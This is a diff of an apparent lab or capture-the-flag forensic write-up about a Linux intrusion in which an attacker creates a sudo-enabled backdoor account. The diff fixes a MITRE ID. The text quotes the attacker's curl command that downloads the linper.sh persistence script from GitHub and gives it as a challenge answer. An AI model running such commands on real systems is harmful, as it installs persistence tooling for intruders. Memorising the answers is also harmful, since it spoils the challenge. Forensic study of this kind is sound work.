@@ -96,7 +96,7 @@
     ```
   * **Mechanism 1: Account Creation**
     * The attacker, utilizing the existing **`root`** privileges, created a new, non-standard user account named **`cyberjunkie`** (Event 3) at **`06:34:18`**.
-    * This is a form of **Defense Evasion** and **Persistence** (MITRE T1136.101), intended to provide a secondary, less-monitored backdoor.
+    * This is a form of **Defense Evasion** and **Persistence** (MITRE T1136.001), intended to provide a secondary, less-monitored backdoor.
   * **Mechanism 2: Privilege Maintenance:**
     * The attacker immediately added the `cyberjunkie` account to the **`sudo`** (administrator) group (Event 4) at **`06:35:15`**. After which, the user logs out from `root` at **`06:37:24`**.
     * This ensures that future logins via `cyberjunkie` will still possess **administrator-level privileges**, maintaining high-level access even if the primary `root` account is eventually locked or the password is changed.
@@ -156,4 +156,5 @@
   * **Question 8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
 
       * **Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
+
       * **Reference:** See Event 5 and Section III.C.
